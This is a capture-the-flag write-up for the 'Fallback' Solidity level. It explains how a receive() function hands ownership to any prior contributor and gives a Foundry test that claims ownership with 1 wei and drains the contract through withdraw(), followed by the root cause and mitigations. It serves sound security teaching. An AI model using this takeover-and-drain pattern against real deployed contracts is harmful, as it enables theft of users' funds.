# 01. Fallback

[English](01_Fallback.md) | [한국어](../ko/01_Fallback.md)

## Objective

Complete the level by satisfying both conditions:

1. Take ownership of the `Fallback` contract.
2. Withdraw all ETH held by the contract.

## Key Concepts

- Solidity's `receive()` function
- ETH transfers with empty calldata
- `msg.sender`-based access control
- Coupling privileged state changes with ETH reception
- Foundry cheatcodes such as `vm.prank` and `vm.deal`
- Low-level `call`

## Contract Analysis

### `contribute`

```solidity
function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;

    if (contributions[msg.sender] > contributions[owner]) {
        owner = msg.sender;
    }
}
```

Each call may contribute less than `0.001 ether`. A contributor can become the owner when their cumulative contribution exceeds that of the current owner.

The deployer's contribution is initialized to `1000 ether`, however, so overtaking it through ordinary contributions is impractical. Another path to changing ownership must exist.

### `receive`

```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```

The vulnerability is located in `receive()`. A caller becomes the new owner after meeting only two conditions:

- Send a nonzero amount of ETH.
- Have any prior contribution recorded.

Ownership transfer is directly coupled to ETH reception without explicit approval or authorization from the current owner.

## Solution Flow

```text
Fund the player
        ↓
Send 1 wei to contribute()
        ↓
Satisfy contributions[player] > 0
        ↓
Send 1 wei with empty calldata
        ↓
Trigger receive()
        ↓
Set owner = player
        ↓
Call withdraw()
        ↓
Withdraw the contract balance
```

## Foundry Solution

```solidity
function testSolve() public {
    vm.startPrank(player);

    target.contribute{value: 1 wei}();

    (bool success,) = address(target).call{value: 1 wei}("");
    require(success, "ETH transfer failed");

    assertEq(target.owner(), player);

    target.withdraw();
    assertEq(address(target).balance, 0);

    vm.stopPrank();
}
```

## Why Use Empty Calldata?

When a contract receives ETH with empty calldata, Solidity dispatches the call to `receive()` if that function exists.

```solidity
address(target).call{value: 1 wei}("");
```

This low-level call sends ETH without a function selector, causing `Fallback.receive()` to execute.

## Root Cause

The contract combines ordinary ETH reception with a critical authorization change.

A `receive()` function should generally focus on accepting ETH, but this implementation assigns ownership after checking only whether the sender has ever contributed. Any unauthorized caller can establish that prerequisite with a negligible contribution and then take control.

## Recommended Mitigations

- Remove ownership changes from `receive()`.
- Move ownership transfer into a dedicated, explicit function.
- Restrict ownership transfer so that only the current owner can initiate it.
- Consider OpenZeppelin's `Ownable` implementation and its established transfer pattern.
- Emit ownership-transfer events so privileged state changes remain observable.

## Run the Test

```bash
forge test --match-path test/01_Fallback.t.sol -vvv
```

To inspect the complete solution trace:

```bash
forge test --match-test testSolve -vvvv
```

## Takeaway

Access control remains insecure if any alternative path can modify a privileged state variable. Auditing must cover every state-changing function, including special entry points such as `receive()` and `fallback()`.
